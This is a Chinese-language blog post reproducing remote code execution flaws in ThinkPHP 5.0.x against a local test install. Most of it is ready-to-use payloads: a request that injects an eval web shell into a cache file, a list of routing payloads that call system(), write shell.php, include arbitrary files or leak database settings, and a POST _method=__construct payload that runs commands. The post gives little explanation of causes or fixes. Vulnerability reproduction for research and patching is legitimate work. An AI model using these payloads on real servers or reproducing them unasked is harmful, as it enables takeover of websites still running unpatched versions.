title: ThinkPHP 5 代码执行漏洞复现+POC
categories:
  - 漏洞复现
tags:
  - 漏洞
  - RCE
  - 漏洞复现
  - ThinkPHP 5
  - ThinkPHP
author: Chace
date: 2020-06-09 20:07:00
---
## ThinkPHP 5.0.10 环境框架搭建

ThinkPHP是一个免费开源的，快速、简单的面向对象的轻量级PHP开发框架，是为了敏捷WEB应用开发和简化企业应用开发而诞生的。ThinkPHP从诞生以来一直秉承简洁实用的设计原则，在保持出色的性能和至简的代码的同时，也注重易用性。
<!--more-->
![](1.png)
查看当前版本
![](2.png)
环境搭建成功


## 缓存类导致RCE

### 版本

>5.0.0<=ThinkPHP5<=5.0.10
    
### 测试payload

**漏洞利用条件**

1. 基于tp5开发的代码中使用了Cache::set 进行缓存
2. 在利用版本范围内
3. runtime目录可以访问

创建一个生成缓存的页面
![](3.png)
构造payload如下：

>http://127.0.0.1/public/?username=syst1m%0d%0a@eval($_GET[_]);//
    
成功在缓存文件写入payload

![](4.png)

>http://127.0.0.1/runtime/cache/b0/68931cc450442b63f5b3d276ea4297.php?_=phpinfo();

![](5.png)

成功执行代码
    
## 未开启强制路由导致rce

### 版本

>5.0.0<=ThinkPHP5<=5.0.10
    
### 测试payload

>5.1.x ：
``` html
    ?s=index/\think\Request/input&filter[]=system&data=pwd
    ?s=index/\think\view\driver\Php/display&content=<?php phpinfo();?>
    ?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=<?php phpinfo();?>
    ?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
    ?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
```
>5.0.x ：
``` html
    ?s=index/think\config/get&name=database.username # 获取配置信息
    ?s=index/\think\Lang/load&file=../../test.jpg    # 包含任意文件
    ?s=index/\think\Config/load&file=../../t.php     # 包含任意.php文件
    ?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
```

当前环境版本是5.0.10，构造payload如下：

>http://127.0.0.1/public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami

![](6.png)
成功执行代码

## method任意调用方法导致rce

### 版本

>5.0.0<=ThinkPHP5<=5.0.10
    
### 测试payload

构造payload如下：
```
POST /index.php?s=index HTTP/1.1
_method=__construct&filter[]=system&method=get&get[]=whoami
```

![](7.png)
成功执行代码
## 参考

[Thinkphp5 RCE总结](https://xz.aliyun.com/t/7792#toc-0)
[Thinkphp5 代码执行学习](https://y4er.com/post/thinkphp5-rce)